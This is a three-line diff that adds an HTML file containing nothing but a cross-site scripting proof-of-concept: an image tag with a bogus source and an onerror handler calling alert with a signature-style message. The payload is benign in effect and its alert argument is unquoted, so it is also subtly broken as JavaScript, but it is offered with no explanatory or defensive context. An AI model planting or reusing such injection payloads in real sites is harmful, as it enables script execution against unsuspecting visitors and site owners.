@@ -1,0 +1,3 @@
+<html>
+<img src=x onerror=alert(XSS BY GOZIEM)>
+</html>
